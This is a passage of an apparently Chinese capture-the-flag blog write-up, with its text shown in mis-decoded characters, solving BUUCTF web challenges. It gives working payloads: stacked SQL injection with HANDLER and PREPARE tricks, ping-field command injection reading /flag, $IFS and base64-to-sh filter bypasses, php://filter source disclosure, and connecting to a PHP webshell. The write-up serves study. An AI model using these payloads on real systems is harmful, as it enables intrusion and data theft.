          <a href="#æ€»çš„payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»çš„payload" class="headerlink" title="æ€»çš„payload"></a>æ€»çš„payload</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></div></figure>

<p>æœ€åè¾“å…¥1æäº¤å³å¯</p>

        <h2 id="2-è§£æ³•äºŒ-openå’Œhandler"   >
          <a href="#2-è§£æ³•äºŒ-openå’Œhandler" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è§£æ³•äºŒ-openå’Œhandler" class="headerlink" title="2.è§£æ³•äºŒ(openå’Œhandler)"></a>2.è§£æ³•äºŒ(openå’Œhandler)</h2>
      <p>åˆ©ç”¨openå’Œhandleå…³é”®å­—</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å¯ä»¥ç›´æ¥è¯»å‡ºæ¥è¡¨<code>1919810931114514</code>çš„æ‰€æœ‰å†…å®¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071711484.png" alt="image-20220107171100441"></p>

        <h2 id="3-è§£æ³•ä¸‰-MySQLçš„é¢„å¤„ç†"   >
          <a href="#3-è§£æ³•ä¸‰-MySQLçš„é¢„å¤„ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è§£æ³•ä¸‰-MySQLçš„é¢„å¤„ç†" class="headerlink" title="3.è§£æ³•ä¸‰(MySQLçš„é¢„å¤„ç†)"></a>3.è§£æ³•ä¸‰(MySQLçš„é¢„å¤„ç†)</h2>
      <p>åˆ©ç”¨é¢„å¤„ç†æœºåˆ¶prepareå’Œconcatæ‹¼æ¥è·å¾—selectæ“ä½œï¼Œä¹‹åexecuteæ¥æ‰§è¡Œï¼Œè¿™é‡Œå¥½åƒä¸èƒ½å°å†™ï¼Œå¯ä»¥é€šè¿‡å¤§å†™æ¥ç»•è¿‡</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;PREPARE st from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` </span><br><span class="line">&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071717419.png" alt="image-20220107171702374"></p>

        <h1 id="å…­ã€-SUCTF-2019-EasySQL"   >
          <a href="#å…­ã€-SUCTF-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…­ã€-SUCTF-2019-EasySQL" class="headerlink" title="å…­ã€[SUCTF 2019]EasySQL"></a>å…­ã€[SUCTF 2019]EasySQL</h1>
      <p>æ¶‰åŠçŸ¥è¯†ç‚¹æœ‰ç‚¹å¤š</p>

        <h1 id="ä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-Exec"   >
          <a href="#ä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-Exec" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="ä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>ä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]Exec</h1>
      
        <h2 id="ğŸ”ºå‘½ä»¤æ‰§è¡Œ-å¯»æ‰¾flag"   >
          <a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œ-å¯»æ‰¾flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œ-å¯»æ‰¾flag" class="headerlink" title="ğŸ”ºå‘½ä»¤æ‰§è¡Œ+å¯»æ‰¾flag"></a>ğŸ”ºå‘½ä»¤æ‰§è¡Œ+å¯»æ‰¾flag</h2>
      
        <h2 id="1-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"   >
          <a href="#1-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="1.è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>1.è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h2>
      <p>ä¸€èˆ¬è¿™ç§pingçš„ç•Œé¢ï¼Œéƒ½å¯èƒ½ä¼šæ¶‰åŠåˆ°å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091203487.png" alt="image-20220109120351450"></p>
<p>é‚£ä¹ˆç›´æ¥å°è¯•ä¸€ä¸‹å³å¯ï¼Œpingä¸€ä¸‹æœ¬åœ°å›ç¯åœ°å€</p>
<p>è¾“å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;pwd</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091204354.png" alt="image-20220109120428320"></p>
<p>å¯ä»¥çœ‹åˆ°å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆå°±å°è¯•æ‰¾flagåœ¨å“ªï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªè·¯å¾„æœç´¢ã€‚</p>

        <h2 id="2-æœç´¢flagè·¯å¾„"   >
          <a href="#2-æœç´¢flagè·¯å¾„" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æœç´¢flagè·¯å¾„" class="headerlink" title="2.æœç´¢flagè·¯å¾„"></a>2.æœç´¢flagè·¯å¾„</h2>
      <p>è¾“å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206984.png" alt="image-20220109120604954"></p>
<p>é‚£ä¹ˆå»æ ¹ç›®å½•æ‰¾</p>
<p>è¾“å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls /</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206321.png" alt="image-20220109120649283"></p>
<p>å¯ä»¥çœ‹åˆ°flagï¼Œé‚£ä¹ˆç›´æ¥catå³å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat /flag</span><br></pre></td></tr></table></div></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091207995.png" alt="image-20220109120742963"></p>

        <h1 id="å…«ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"   >
          <a href="#å…«ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…«ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="å…«ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>å…«ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h1>
      
        <h2 id="ğŸ”ºæŠ“åŒ…-ä¼ªåè®®"   >
          <a href="#ğŸ”ºæŠ“åŒ…-ä¼ªåè®®" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæŠ“åŒ…-ä¼ªåè®®" class="headerlink" title="ğŸ”ºæŠ“åŒ…+ä¼ªåè®®"></a>ğŸ”ºæŠ“åŒ…+ä¼ªåè®®</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢"   >
          <a href="#1-å‰æœŸæ¢ç´¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>æŸ¥çœ‹æºä»£ç ï¼Œæœ‰å¦‚ä¸‹æ–‡ä»¶ï¼Œè®¿é—®ä¸€ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091210479.png" alt="image-20220109121055447"></p>
<p>æ¥ç€æŒ‰ç…§æç¤ºï¼Œä½†æ˜¯ç›´æ¥è·³è½¬åˆ°äº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091211532.png" alt="image-20220109121144475"></p>
<p>é‚£ä¹ˆä¸­é—´å¯èƒ½æ‰§è¡Œå¤ªå¿«ï¼Œè¿™æ—¶å€™å°±éœ€è¦æŠ“åŒ…æ¥çœ‹çœ‹å…·ä½“æ˜¯æ€ä¹ˆæ‰§è¡Œçš„ã€‚</p>

        <h2 id="2-æŠ“åŒ…"   >
          <a href="#2-æŠ“åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æŠ“åŒ…" class="headerlink" title="2.æŠ“åŒ…"></a>2.æŠ“åŒ…</h2>
      <p>ç”¨BurpSuitæŠ“åŒ…ï¼Œå‘ç°æœ‰ä¸€ä¸ªaction.phpï¼Œé‡Œé¢æœ‰ä¸ªsecr3t.phpçš„æç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091834445.png" alt="image-20220109183459387"></p>
<p>è®¿é—®ä¸€ä¸‹secr3t.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091835473.png" alt="image-20220109183542434"></p>
<p>æç¤ºæ”¾åœ¨äº†flag.phpï¼Œè®¿é—®ä¹‹åå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091836077.png" alt="image-20220109183616033"></p>
<p>é‚£ä¹ˆè¿™é‡Œç”±äºsecr3t.phpå­˜åœ¨fileçš„åè®®ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨phpä¼ªåè®®è·å–flag.phpçš„æºä»£ç </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091837080.png" alt="image-20220109183730031"></p>
<p>æ‹¿åˆ°CyberChefè§£å¯†ï¼Œå¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091838079.png" alt="image-20220109183825033"></p>

        <h1 id="ä¹ã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"   >
          <a href="#ä¹ã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¹ã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="ä¹ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>ä¹ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h1>
      
        <h1 id="åã€-GXYCTF2019-Ping-Ping-Ping"   >
          <a href="#åã€-GXYCTF2019-Ping-Ping-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#åã€-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="åã€[GXYCTF2019]Ping Ping Ping"></a>åã€[GXYCTF2019]Ping Ping Ping</h1>
      
        <h2 id="ğŸ”ºå‘½ä»¤æ‰§è¡Œ"   >
          <a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ğŸ”ºå‘½ä»¤æ‰§è¡Œ"></a>ğŸ”ºå‘½ä»¤æ‰§è¡Œ</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢-1"   >
          <a href="#1-å‰æœŸæ¢ç´¢-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢-1" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>Pingæç¤º+ipï¼Œåº”è¯¥æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥lsè¯•è¯•</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102003467.png" alt="image-20220110200315404"></p>
<p>å‘ç°flagï¼Œå°è¯•cat</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102004540.png" alt="image-20220110200415489"></p>

        <h2 id="2-ç»•è¿‡è¿‡æ»¤"   >
          <a href="#2-ç»•è¿‡è¿‡æ»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»•è¿‡è¿‡æ»¤" class="headerlink" title="2.ç»•è¿‡è¿‡æ»¤"></a>2.ç»•è¿‡è¿‡æ»¤</h2>
      <p>åº”è¯¥æ˜¯è¿‡æ»¤çš„ç©ºæ ¼</p>
<p>â–²ç»•è¿‡ç©ºæ ¼ï¼šä¸€èˆ¬æ€è·¯å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //å…¶ä¸­é‚£ä¸ª1åŠ å…¶ä»–çš„åº”è¯¥éƒ½è¡Œ</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">$20</span><br><span class="line">$09(ç©ºå­—ç¬¦)</span><br></pre></td></tr></table></div></figure>

<p>å‚è€ƒ[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12313368.html" >GXYCTF2019]Ping Ping Ping - æ˜¥å‘Šé³¥ - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä½¿ç”¨<code>$IFS</code>å¯ä»¥ï¼Œä½†æ˜¯åˆå‘ç°è¿‡æ»¤äº†flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102021256.png" alt="image-20220110202147216"></p>
<p>é‚£ä¹ˆæ¥ä¸‹çš„è§£æ³•å°±å¤šç§å¤šæ ·äº†ã€‚</p>

        <h3 id="è§£æ³•ä¸€ï¼šæ‹¼æ¥flag"   >
          <a href="#è§£æ³•ä¸€ï¼šæ‹¼æ¥flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•ä¸€ï¼šæ‹¼æ¥flag" class="headerlink" title="è§£æ³•ä¸€ï¼šæ‹¼æ¥flag"></a>è§£æ³•ä¸€ï¼šæ‹¼æ¥flag</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;b=ag.php;a=fl;cat$IFS$1$a$b</span><br></pre></td></tr></table></div></figure>

<p>flagåœ¨æ³¨é‡Šé‡Œï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111127902.png" alt="image-20220111112715736"></p>

        <h3 id="è§£æ³•äºŒï¼šshç»“åˆbase64"   >
          <a href="#è§£æ³•äºŒï¼šshç»“åˆbase64" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•äºŒï¼šshç»“åˆbase64" class="headerlink" title="è§£æ³•äºŒï¼šshç»“åˆbase64"></a>è§£æ³•äºŒï¼šshç»“åˆbase64</h3>
      
        <h4 id="â–²linuxè‡ªå¸¦base64å’Œbase32"   >
          <a href="#â–²linuxè‡ªå¸¦base64å’Œbase32" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²linuxè‡ªå¸¦base64å’Œbase32" class="headerlink" title="â–²linuxè‡ªå¸¦base64å’Œbase32"></a>â–²linuxè‡ªå¸¦base64å’Œbase32</h4>
      <p>ç”±äºlinuxçš„shè‡ªå¸¦base64çš„åŠ è§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥base64çš„å¯†æ–‡ï¼Œç„¶ååˆ©ç”¨linuxçš„shç»ˆç«¯è‡ªå¸¦çš„base64è§£å¯†åŠŸèƒ½è¿›è¡Œè§£å¯†ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šç»•è¿‡å¾ˆå¤šè¿‡æ»¤ï¼Œå¦å¤–base32ä¹Ÿå¯ä»¥</p>

        <h4 id="1-base64åŠ å¯†"   >
          <a href="#1-base64åŠ å¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-base64åŠ å¯†" class="headerlink" title="(1)base64åŠ å¯†"></a>(1)base64åŠ å¯†</h4>
      <p>ä½¿ç”¨CyberChefæˆ–è€…linuxå‘½ä»¤è¡Œéƒ½è¡Œ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136396.png" alt="image-20220111113614306"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136522.png" alt="image-20220111113634402"></p>

        <h4 id="2-base64è§£å¯†"   >
          <a href="#2-base64è§£å¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-base64è§£å¯†" class="headerlink" title="(2)base64è§£å¯†"></a>(2)base64è§£å¯†</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</span><br></pre></td></tr></table></div></figure>

<p>å°†ä¹‹å‰åŠ å¯†çš„â€cat flag.phpâ€ä¼ ç»™base64è§£å¯†ï¼Œç„¶åshæ‰§è¡Œ</p>
<p>å¯¹åº”å†™åœ¨URLä¸Šå³ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh</span><br></pre></td></tr></table></div></figure>


        <h3 id="è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ"   >
          <a href="#è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ" class="headerlink" title="è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ"></a>è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ</h3>
      <p>å‘½ä»¤ä¸­ä¼šå…ˆæ‰§è¡Œåå¼•å·é‡Œçš„ï¼Œç„¶åå°†è¾“å…¥ç»“æœä¾æ¬¡ä¼ é€’ç»™å…¶ä»–å‘½ä»¤è¿›è¡Œæ‰§è¡Œ</p>
<p>ç”±äºflagå°±åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰€ä»¥</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat `ls`;</span><br><span class="line"><span class="comment">#å…ˆæ‰§è¡Œlsè¾“å‡º index.php å’Œ flag.phpï¼Œä¹‹åå°†è¾“å…¥ç»“æœç»™åˆ°catå‘½ä»¤ï¼Œç›¸å½“äºå†æ‰§è¡Œ cat index.php;cat flag.php</span></span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”URLä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></div></figure>


        <h2 id="â–²å…¶ä»–"   >
          <a href="#â–²å…¶ä»–" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²å…¶ä»–" class="headerlink" title="â–²å…¶ä»–"></a>â–²å…¶ä»–</h2>
      <p>æ­¤å¤–å‘½ä»¤æ‰§è¡Œæœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥ç»•è¿‡ï¼Œè¿™é‡Œbanæ‰äº†å¾ˆå¤šï¼Œåƒ<code>&lt;</code>ï¼Œ<code>\</code>ç­‰éƒ½æ˜¯æœ‰å¯èƒ½</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/GLory-LTF/p/15359485.html" >å‘½ä»¤æ‰§è¡Œç»•è¿‡çš„æ–¹æ³• - GLCC - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="åä¸€ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Knife"   >
          <a href="#åä¸€ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¸€ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="åä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>åä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h1>
      
        <h2 id="ğŸ”ºä¸€å¥è¯æœ¨é©¬"   >
          <a href="#ğŸ”ºä¸€å¥è¯æœ¨é©¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ğŸ”ºä¸€å¥è¯æœ¨é©¬"></a>ğŸ”ºä¸€å¥è¯æœ¨é©¬</h2>
      <p>ä¾æ®æç¤ºä»¥åŠå¦‚ä¸‹çš„è¯­å¥ï¼ŒçŒœæµ‹æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œå¯†ç ä¸ºSyc</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111449555.png" alt="image-20220111144925504"></p>
<p>ä½¿ç”¨èšå‰‘è¿æ¥</p>
<p>èšå‰‘æ•™ç¨‹ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/antswordproject/antsword/srruro" >è·å–èšå‰‘ Â· è¯­é›€ (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ç„¶åç›´æ¥å¤åˆ¶URLè¿›è¡Œè¿æ¥å³å¯ï¼Œå³é”®-&gt;æ·»åŠ æ•°æ®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451527.png" alt="image-20220111145119474"></p>
<p>è¿›å»ä¹‹åè¿›å…¥æ ¹ç›®å½•å¯»æ‰¾flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451771.png" alt="image-20220111145143729"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111452893.png" alt="image-20220111145208831"></p>

        <h1 id="åäºŒã€-æå®¢å¤§æŒ‘æˆ˜-2019-Http"   >
          <a href="#åäºŒã€-æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="heading-link"><i class="fas fa-link"></i></a><a href="#åäºŒã€-æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="åäºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>åäºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h1>
      
        <h2 id="ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´"   >
          <a href="#ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´" class="headerlink" title="ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´"></a>ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢-2"   >
          <a href="#1-å‰æœŸæ¢ç´¢-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢-2" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>ç›´æ¥æºä»£ç ï¼Œæœç´¢.phpï¼Œå‘ç°ä¸€ä¸ªSecrect.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412036.png" alt="image-20220111141159974"></p>
<p>ç„¶åè®¿é—®ï¼Œå‘ç°éœ€è¦ä»<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://sycsecret.buuoj.cnè®¿é—®æ‰è¡Œ/" >https://Sycsecret.buuoj.cnè®¿é—®æ‰è¡Œ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412596.png" alt="image-20220111141218518"></p>
<p>é‚£ä¹ˆå°±ä½¿ç”¨BurpSuiteè¿›è¡Œä¿®æ”¹</p>

        <h2 id="2-BurpSuiteä½¿ç”¨æ”¹åŒ…"   >
          <a href="#2-BurpSuiteä½¿ç”¨æ”¹åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BurpSuiteä½¿ç”¨æ”¹åŒ…" class="headerlink" title="2.BurpSuiteä½¿ç”¨æ”¹åŒ…"></a>2.BurpSuiteä½¿ç”¨æ”¹åŒ…</h2>
      <p>é¦–å…ˆæµè§ˆå™¨å¼€å¯ä»£ç†ï¼ŒBurpSuiteæŠ“åˆ°åŒ…</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111413501.png" alt="image-20220111141339457"></p>
<p>ç„¶åå°†åŒ…å‘é€åˆ°<code>repeater</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111414701.png" alt="image-20220111141424655"></p>
<p>åœ¨Repeateræœ€æ–°å‡ºç°çš„ä¸€éƒ¨åˆ†å°±æ˜¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111415489.png" alt="image-20220111141531436"></p>

        <h3 id="1-ä¿®æ”¹Referer"   >
          <a href="#1-ä¿®æ”¹Referer" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¿®æ”¹Referer" class="headerlink" title="(1)ä¿®æ”¹Referer"></a>(1)ä¿®æ”¹Referer</h3>
      <p>ç”±äºè¯´è¦ä»<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://sycsecret.buuoj.cnè®¿é—®,æ‰€ä»¥æ·»åŠ å¦‚ä¸‹,åœ¨getä¸‹æ·»åŠ /" >https://Sycsecret.buuoj.cnè®¿é—®ï¼Œæ‰€ä»¥æ·»åŠ å¦‚ä¸‹ï¼Œåœ¨Getä¸‹æ·»åŠ </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111417813.png" alt="image-20220111141726767"></p>
<p>ç‚¹å‡»GoæŒ‰é’®å‘é€åŒ…</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418470.png" alt="image-20220111141823417"></p>
<p>è¿”å›çš„åŒ…æç¤ºä¸è¡Œï¼Œé‚£ä¹ˆéœ€è¦ä¿®æ”¹æµè§ˆå™¨åç§°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418007.png" alt="image-20220111141837951"></p>

        <h3 id="2-ä¿®æ”¹User-Agent"   >
          <a href="#2-ä¿®æ”¹User-Agent" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä¿®æ”¹User-Agent" class="headerlink" title="(2)ä¿®æ”¹User-Agent"></a>(2)ä¿®æ”¹User-Agent</h3>
      <p>ä¿®æ”¹å¦‚ä¸‹</p>
